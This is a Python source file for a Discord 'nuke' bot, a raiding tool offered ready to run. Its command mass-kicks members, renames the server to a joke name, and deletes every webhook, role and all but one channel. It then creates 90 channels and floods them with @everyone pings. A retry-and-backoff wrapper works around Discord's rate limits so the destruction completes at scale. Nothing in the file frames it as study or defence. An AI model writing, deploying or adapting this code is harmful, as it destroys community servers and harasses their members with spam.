import os
import asyncio
import time
from collections import defaultdict
import discord
from discord.ext import commands

NUKE_ALIASES = ["nuke", "destroy", "wreck", "ruin", "raze", "obliterate", "demolish"]

class BucketGuard:
    def __init__(self, per_route: int = 2):
        self.per_route = per_route
        self._locks: dict[str, asyncio.Semaphore] = defaultdict(lambda: asyncio.Semaphore(per_route))
        self._global_until = 0.0
        self._glock = asyncio.Lock()

    async def _wait_global(self):
        async with self._glock:
            now = time.monotonic()
            if self._global_until > now:
                await asyncio.sleep(self._global_until - now)

    async def trip_global(self, seconds: float):
        async with self._glock:
            self._global_until = max(self._global_until, time.monotonic() + seconds)

    async def run(self, route: str, coro_factory, *, retries: int = 6):
        sem = self._locks[route]
        for attempt in range(retries):
            await self._wait_global()
            async with sem:
                try:
                    return await coro_factory()
                except discord.HTTPException as e:
                    if e.status == 429:
                        retry_after = getattr(e, "retry_after", None) or 1.0
                        if getattr(e, "is_global", False):
                            await self.trip_global(retry_after)
                        await asyncio.sleep(retry_after + 0.1 * attempt)
                        continue
                    if e.status in (500, 502, 503, 504):
                        await asyncio.sleep(0.5 * (attempt + 1))
                        continue
                    raise
                except (discord.Forbidden, discord.NotFound):
                    raise
        raise RuntimeError(f"route {route} exhausted retries")

GUARD = BucketGuard(per_route=3)

class NukeConfirm(discord.ui.View):
    def __init__(self, author: discord.User):
        super().__init__(timeout=60)
        self.author = author
        self.kick_choice: bool | None = None

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author.id:
            await interaction.response.send_message("Not your confirm.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="YES", style=discord.ButtonStyle.danger)
    async def yes(self, interaction: discord.Interaction, _):
        self.kick_choice = True
        await interaction.response.edit_message(embed=discord.Embed(description="☢️ NUKE INITIATED", color=discord.Color.orange()), view=None)
        self.stop()

    @discord.ui.button(label="NO", style=discord.ButtonStyle.secondary)
    async def no(self, interaction: discord.Interaction, _):
        self.kick_choice = False
        await interaction.response.edit_message(embed=discord.Embed(description="☢️ NUKE INITIATED", color=discord.Color.orange()), view=None)
        self.stop()

class Nuke(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot

    @commands.command(name="nuke", aliases=NUKE_ALIASES[1:])
    @commands.has_permissions(administrator=True)
    @commands.guild_only()
    async def nuke(self, ctx: commands.Context):
        view = NukeConfirm(ctx.author)
        embed = discord.Embed(
            title="☢️ NUKE",
            description=f"**{ctx.guild.name}**\nDo you want to kick other people?",
            color=discord.Color.orange()
        )
        
        try:
            prompt = await ctx.author.send(embed=embed, view=view)
            await ctx.reply("Check your DMs to confirm.", mention_author=False, delete_after=5)
        except discord.Forbidden:
            return await ctx.reply("I cannot DM you. Enable DMs.", mention_author=False, delete_after=5)
            
        await view.wait()
        if view.kick_choice is None:
            return await prompt.edit(embed=discord.Embed(description="Cancelled (timed out).", color=discord.Color.red()), view=None)

        status = await ctx.send("☢️ NUKE INITIATED")
        await self._run(ctx, view.kick_choice, status)

    async def _run(self, ctx: commands.Context, kick_enabled: bool, status: discord.Message):
        guild = ctx.guild
        author_id = ctx.author.id
        bot_id = self.bot.user.id
        owner_id = guild.owner_id

        counts = {"kicked": 0, "channels": 0, "roles": 0, "webhooks": 0, "created": 0}
        errors: list[str] = []

        def err(label: str, e: Exception):
            errors.append(f"{label}: {type(e).__name__}: {str(e)[:60]}")

        if kick_enabled:
            targets = [m for m in list(guild.members) if m.id not in (bot_id, author_id, owner_id) and not m.bot]
            sem = asyncio.Semaphore(10)
            async def do_kick(m: discord.Member):
                async with sem:
                    try:
                        await GUARD.run(f"kick:{guild.id}", lambda: m.kick(reason="nuke"))
                        counts["kicked"] += 1
                    except Exception as e:
                        err(f"kick {m}", e)
            await asyncio.gather(*(do_kick(m) for m in targets))

        try:
            await GUARD.run(f"guild_edit:{guild.id}", lambda: guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉", reason="nuke"))
        except Exception as e:
            err("rename", e)

        try:
            hooks = await GUARD.run(f"webhooks:{guild.id}", lambda: guild.fetch_webhooks())
        except Exception as e:
            err("fetch webhooks", e)
            hooks = []
        hook_sem = asyncio.Semaphore(5)
        async def kill_hook(wh: discord.Webhook):
            async with hook_sem:
                try:
                    await GUARD.run(f"webhook_delete:{wh.id}", lambda: wh.delete(reason="nuke"))
                    counts["webhooks"] += 1
                except Exception as e:
                    err(f"hook {wh}", e)
        await asyncio.gather(*(kill_hook(w) for w in hooks))

        roles = [r for r in guild.roles if not r.is_default() and not r.managed]
        role_sem = asyncio.Semaphore(4)
        async def kill_role(r: discord.Role):
            async with role_sem:
                try:
                    await GUARD.run(f"role_delete:{guild.id}", lambda: r.delete(reason="nuke"))
                    counts["roles"] += 1
                except Exception as e:
                    err(f"role {r}", e)
        await asyncio.gather(*(kill_role(r) for r in roles))

        channels = list(guild.channels)
        keep = channels[-1] if channels else None
        del_sem = asyncio.Semaphore(4)
        async def kill_channel(ch: discord.abc.GuildChannel):
            if ch == keep:
                return
            async with del_sem:
                try:
                    await GUARD.run(f"channel_delete:{ch.id}", lambda: ch.delete(reason="nuke"))
                    counts["channels"] += 1
                except Exception as e:
                    err(f"channel {ch}", e)
        await asyncio.gather(*(kill_channel(c) for c in channels))

        # --- BATCH 1: CREATE 90 CHANNELS ---
        created_channels = []
        for i in range(90):
            try:
                channel = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="𝔤𝔤 𝔈ℨ", reason="nuke"))
                created_channels.append(channel)
            except Exception as e:
                err("create channel", e)
            # Small delay to avoid hitting the channel creation route too hard
            await asyncio.sleep(1.5)
            
        counts["created"] = len(created_channels)

        # --- BATCH 2: PING EVERYONE IN CREATED CHANNELS ---
        spam_text = (
            "# say 67 ┃ <@everyone> <@here> ┃ "
            "WASSUP CHAT ┃ https://tenor.com/dJqMW8ku92x.gif"
        )
        
        for channel in created_channels:
            for _ in range(5): # 5 pings per channel to avoid instant message rate limit
                try:
                    await GUARD.run(f"msg:{channel.id}", lambda: channel.send(f"@everyone\n{spam_text}", allowed_mentions=discord.AllowedMentions(everyone=True)))
                except Exception:
                    break
                await asyncio.sleep(0.5)

        target = None
        for ch in guild.channels:
            if isinstance(ch, discord.TextChannel) and ch.permissions_for(guild.me).send_messages:
                target = ch
                break
        if target is None:
            try:
                target = await GUARD.run(f"channel_create:{guild.id}", lambda: guild.create_text_channel(name="report", reason="nuke"))
            except Exception as e:
                err("final channel", e)

        embed = discord.Embed(
            title="☢️ COMPLETE",
            description=(
                f"**kicked:** {counts['kicked']}\n"
                f"**deleted:** {counts['channels']} ch · {counts['roles']} roles · {counts['webhooks']} hooks\n"
                f"**created:** {counts['created']} channels\n"
                f"**by:** {ctx.author.mention}"
            ),
            color=discord.Color.red(),
        )
        if errors:
            embed.add_field(name="⚠️", value="\n".join(errors[:5]) + (f"\n+{len(errors)-5}" if len(errors) > 5 else ""), inline=False)
        if target:
            try:
                await GUARD.run(f"msg:{target.id}", lambda: target.send(embed=embed))
            except Exception:
                pass

    @nuke.error
    async def nuke_error(self, ctx, error):
        if isinstance(error, commands.MissingPermissions):
            msg = "You need Administrator."
        elif isinstance(error, commands.BotMissingPermissions):
            msg = f"I'm missing: {', '.join(error.missing_permissions)}"
        elif isinstance(error, commands.MissingRequiredArgument):
            msg = "Usage: `$nuke`"
        elif isinstance(error, commands.NoPrivateMessage):
            msg = "Guild only."
        else:
            msg = f"`{type(error).__name__}`: {error}"
        await ctx.reply(embed=discord.Embed(description=msg, color=discord.Color.red()), mention_author=False)

# ==========================================
# STARTER CODE
# ==========================================
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix="$", intents=intents)

@bot.event
async def on_ready():
    print(f"LOGGED IN AS {bot.user}")

async def main():
    async with bot:
        await bot.add_cog(Nuke(bot))
        await bot.start(os.environ["DISCORD_TOKEN"])

if __name__ == "__main__":
    asyncio.run(main())
